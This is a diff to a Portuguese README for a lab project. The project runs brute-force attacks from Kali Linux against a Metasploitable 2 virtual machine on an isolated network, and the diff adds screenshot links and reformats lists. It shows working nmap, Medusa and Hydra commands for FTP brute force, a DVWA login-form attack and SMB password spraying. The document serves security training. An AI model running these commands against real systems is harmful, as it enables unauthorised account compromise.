@@ -6,15 +6,15 @@ Este projeto demonstra a implementação de ataques de força bruta usando o Kal
 ## Ambiente Configurado
 - **Libvirt**: Ferramenta de virtualização.
 - **Kali Linux**: Utilizado para realizar os ataques.
-    RAM 2GB
-    VCPU 2
-    Disco 40GB
-    Rede Isolada 172.20.0.2
+    - RAM 2GB
+    - VCPU 2
+    - Disco 40GB
+    - Rede Isolada 172.20.0.2
 - **Metasploitable 2**: Ambiente vulnerável onde os ataques foram realizados.
-    RAM 2GB
-    VCPU 2
-    Disco 8GB
-    Rede Isolada 172.20.0.101
+    - RAM 2GB
+    - VCPU 2
+    - Disco 8GB
+    - Rede Isolada 172.20.0.101
 - **Ferramentas utilizadas**:
   - Medusa
   - Nmap
@@ -25,6 +25,7 @@ Este projeto demonstra a implementação de ataques de força bruta usando o Kal
 
 - Utilizamos o nmap para fazer o reconhecimento scaneando as portas abertas no nosso alvo **Metaspoitable 2**
 `nmap -sV 172.20.0.101
+![](images/rec_scan.png)
 
 Após descobrimos todas portas abertas no nosso alvo seguiremos com a proposta do desafio realizando os ataques.
 
@@ -34,15 +35,25 @@ Após descobrimos todas portas abertas no nosso alvo seguiremos com a proposta d
 - **Comando Executado**: `medusa -h <IP-Metasploitable> -U users.txt -P /usr/share/wordlists/rockyou.txt -M ftp -t 10 | tee /tmp/acesso_ftp` 
 - **Resultado**: A senha foi descoberta com sucesso após várias tentativas e acesso com credenciais.
 
+![](images/medusa.png)
+![](images/medusa_check.png)
+![](images/ftp_access.png)
+
+
 ### 2. Ataque no Formulário Web (DVWA)
 - **Comando Executado**: `hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.101 http-post-form \
 "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
 -V -t 6 -f`
 - **Resultado**: Senha descoberta com sucesso, acesso autorizado ao painel de administração do DVWA.
+![](images/dvwa.png)
+![](images/hydra.png)
+![](images/dvwa_log.png)
 
 ### 3. Password Spraying em SMB
 - **Comando Executado**: `medusa -h 172.20.0.101 -U user.txt -P /usr/share/wordlists/rockyou.txt -M smbnt -t 2 -T 50 | tee /tmp/smb_pss.txt`
 - **Resultado**: Senha descoberta e acesso a compartilhamento SMB.
+![](images/pss_smb.png)
+![](images/smb_access.png)
 
 ## Medidas de Mitigação
 - **Senhas fortes**: Implementar políticas de senha forte.
